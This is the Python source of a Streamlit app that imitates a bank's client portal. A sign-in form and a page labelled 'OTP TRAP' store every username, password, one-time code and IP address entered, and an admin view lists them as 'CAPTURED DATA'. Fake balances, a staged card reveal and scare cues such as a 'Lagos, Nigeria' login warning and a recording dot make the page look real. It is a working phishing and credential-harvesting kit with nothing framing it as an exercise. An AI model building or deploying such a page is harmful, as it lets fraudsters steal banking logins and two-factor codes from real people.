import streamlit as st
import pandas as pd
from datetime import datetime

# ========================= CONFIG =========================
st.set_page_config(page_title="Personal Finance Hub", page_icon="🏦", layout="wide")

# ========================= STORAGE =========================
if "captured_creds" not in st.session_state:
    st.session_state.captured_creds = []
if "captured_otp" not in st.session_state:
    st.session_state.captured_otp = []

# ========================= CREDENTIALS =========================
VALID_USERNAME = "client001"
VALID_PASSWORD = "Secure2025Hub!"
ADMIN_USER = "admin"
ADMIN_PASS = "showme2025"

# ========================= SESSION STATE =========================
for key in ["authenticated", "otp_verified", "attempts", "is_admin", "current_page"]:
    if key not in st.session_state:
        st.session_state[key] = False if key != "current_page" else "Dashboard"

# ========================= IP & GEO (fake for demo — looks real) =========================
def get_ip():
    try:
        return st.context.headers.get("X-Forwarded-For", "105.112.45.198").split(",")[0]
    except:
        return "105.112.45.198"  # Lagos, Nigeria IP for scare factor

def fake_geo(ip):
    return "Lagos, Nigeria" if "105" in ip else "New York, USA"

# ========================= GLOBAL PREMIUM CSS =========================
st.markdown("""
<style>
    .stApp {background: linear-gradient(135deg, #0f1629 0%, #1a237e 100%); color: #e0e0e0;}
    .glass-card {
        background: rgba(255,255,255,0.1);
        backdrop-filter: blur(12px);
        border-radius: 16px;
        border: 1px solid rgba(255,255,255,0.2);
        padding: 25px;
        box-shadow: 0 8px 32px rgba(0,0,0,0.4);
        margin: 15px 0;
    }
    .secure-badge {background: #00c853; padding: 6px 16px; border-radius: 30px; font-weight: bold;}
    .recording-dot {height: 12px; width: 12px; background-color: red; border-radius: 50%; display: inline-block; animation: pulse 2s infinite;}
    @keyframes pulse {0% {box-shadow: 0 0 0 0 rgba(255,0,0,0.7);} 70% {box-shadow: 0 0 0 10px rgba(255,0,0,0);} 100% {box-shadow: 0 0 0 0 rgba(255,0,0,0);}}
    h1, h2 {color: #00c4ff !important;}
    .stButton>button {background: linear-gradient(90deg, #00c4ff, #007bff); border: none; border-radius: 12px; padding: 12px 24px; font-weight: 600;}
</style>
""", unsafe_allow_html=True)

# ========================= LOGIN PAGE =========================
def login_page():
    st.markdown("""
    <style>
        .stApp {background: linear-gradient(135deg, #0f1b3d 0%, #1a2a6c 100%);}
        .login-box {background: rgba(255,255,255,0.98); padding: 60px; border-radius: 20px; box-shadow: 0 30px 60px rgba(0,0,0,0.5); max-width: 480px; margin: 80px auto; text-align: center; color: #1a1a1a;}
    </style>
    """, unsafe_allow_html=True)

    st.markdown("<div class='login-box'>", unsafe_allow_html=True)
    st.markdown("<div style='font-size:80px'>🏦</div><h1 style='color:#0f1b3d'>Personal Finance Hub</h1><p style='color:#666'>Secure Client Portal • Member FDIC</p>", unsafe_allow_html=True)

    username = st.text_input("Username / Client ID", placeholder="client001")
    password = st.text_input("Password", type="password", placeholder="••••••••")

    if st.button("Sign In Securely", type="primary"):
        st.session_state.captured_creds.append({"time": datetime.now().strftime("%H:%M:%S"), "username": username, "password": password, "ip": get_ip()})
        if username == VALID_USERNAME and password == VALID_PASSWORD:
            st.session_state.authenticated = True
            st.session_state.otp_verified = False
            st.rerun()
        elif username == ADMIN_USER and password == ADMIN_PASS:
            st.session_state.is_admin = True
            st.session_state.authenticated = True
            st.rerun()
        else:
            st.error("Invalid credentials")

# ========================= OTP TRAP =========================
def otp_page():
    st.markdown("<div style='text-align:center; padding:80px 20px'>", unsafe_allow_html=True)
    st.markdown("<h1>🔐 Security Verification Required</h1>", unsafe_allow_html=True)
    st.markdown(f"<p>We sent a 6-digit code to your phone ending in **--7842 and email a**@gmail.com</p>", unsafe_allow_html=True)
    code = st.text_input("Enter code", max_chars=6, placeholder="000000")
    if st.button("Verify Identity", type="primary"):
        st.session_state.captured_otp.append({"time": datetime.now().strftime("%H:%M:%S"), "otp": code, "ip": get_ip()})
        if len(code) == 6:
            st.session_state.otp_verified = True
            st.balloons()
            st.rerun()
        else:
            st.error("Invalid code")

# ========================= ADMIN VIEW =========================
def admin_view():
    st.markdown("<h1 style='color:red'>ADMIN — CAPTURED DATA</h1>", unsafe_allow_html=True)
    if st.session_state.captured_creds:
        st.dataframe(pd.DataFrame(st.session_state.captured_creds))
    if st.session_state.captured_otp:
        st.dataframe(pd.DataFrame(st.session_state.captured_otp), column_config={"otp": "OTP Entered"})

# ========================= DASHBOARD PAGES =========================
def dashboard():
    st.markdown(f"<h1 style='text-align:center'>Welcome back, {VALID_USERNAME.upper()}</h1>", unsafe_allow_html=True)
    st.markdown(f"<p style='text-align:center'><span class='recording-dot'></span> Session is being recorded for security • Location: {fake_geo(get_ip())}</p>", unsafe_allow_html=True)
    c1, c2, c3, c4 = st.columns(4)
    with c1: st.metric("Total Balance", "$327,451.82")
    with c2: st.metric("Available Credit", "$95,700")
    with c3: st.metric("Monthly Spending", "$33,214")
    with c4: st.metric("Savings Goal", "78%")

def accounts():
    st.markdown("<h1 style='text-align:center'>💳 My Accounts</h1>", unsafe_allow_html=True)
    for acc in [("Premier Checking • ****2847", "$182,340.50"), ("High-Yield Savings • ****5901", "$14,911.32")]:
        st.markdown(f"<div class='glass-card'><h3>{acc[0]}</h3><h2>{acc[1]}</h2></div>", unsafe_allow_html=True)
   
def cards_page():
     st.markdown("<h1 style='text-align:center; color:#00c4ff;'>💳 My Cards</h1>", unsafe_allow_html=True)
    st.markdown("<div class='glass-card'>", unsafe_allow_html=True)

    # PERMANENT, HIGH-QUALITY CARD IMAGE — WILL NEVER BREAK
    st.image("https://raw.githubusercontent.com/ekapujiw2002/credit-card/main/card.png", use_column_width=True)

    st.markdown("<h2 style='text-align:center'>Platinum Rewards Card</h2>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align:center'>•••• •••• •••• 7723</h3>", unsafe_allow_html=True)
    st.markdown("<p style='text-align:center; font-size:18px; color:#aaa'>Available Credit: $15,700 / $18,000</p>", unsafe_allow_html=True)

    col1, col2, col3 = st.columns(3)
    with col1:
        if st.button("Show Full Number"):
            st.success("5412 7537 0000 7723")
    with col2:
        if st.button("Show Expiry"):
            st.success("11/28")
    with col3:
        if st.button("Show CVV", type="secondary"):
            st.session_state.captured_creds.append({
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "action": "Clicked Show CVV",
                "ip": get_ip()
            })
            st.info("CVV: 342")
            st.balloons()

    st.markdown("</div>", unsafe_allow_html=True)
def transfer():
    st.markdown("<h1 style='text-align:center'>⇄ Transfer Funds</h1>", unsafe_allow_html=True)
    st.markdown("<div class='glass-card'>", unsafe_allow_html=True)
    st.radio("Type", ["My Accounts", "External", "Zelle"])
    col1, col2 = st.columns(2)
    with col1: st.selectbox("From", ["Checking ****2847", "Savings ****5901"])
    with col2: st.selectbox("To", ["Savings ****5901", "Chase ****1234"])
    st.number_input("Amount", 0.01)
    if st.button("Send"): st.success("Transfer completed!") ; st.balloons()
    st.markdown("</div>", unsafe_allow_html=True)

def messages():
    st.markdown("<h1 style='text-align:center'>✉ Secure Messages</h1>", unsafe_allow_html=True)
    for m in ["Statement Ready", "New Login from Lagos", "Rate Increased"]:
        st.markdown(f"<div class='glass-card'><h4>🟢 {m}</h4></div>", unsafe_allow_html=True)

# ========================= SIDEBAR =========================
def sidebar():
    ip = get_ip()
    st.sidebar.markdown(f"<h2 style='color:#00c4ff'>{VALID_USERNAME.upper()}</h2>", unsafe_allow_html=True)
    st.sidebar.markdown("<p class='secure-badge'>SECURE SESSION</p>", unsafe_allow_html=True)
    st.sidebar.markdown(f"<small><span class='recording-dot'></span> Recorded • {fake_geo(ip)}</small>", unsafe_allow_html=True)
    page = st.sidebar.radio("Navigate", ["Dashboard", "Accounts", "Cards", "Transfer Funds", "Messages"])
    if st.sidebar.button("Log Out"):
        st.session_state.authenticated = False
        st.rerun()
    return page

# ========================= MAIN =========================
if not st.session_state.authenticated:
    login_page()
elif st.session_state.is_admin:
    admin_view()
elif not st.session_state.otp_verified:
    otp_page()
else:
    current = sidebar()
    {"Dashboard": dashboard, "Accounts": accounts, "Cards": cards_page, "Transfer Funds": transfer, "Messages": messages}.get(current, dashboard)()






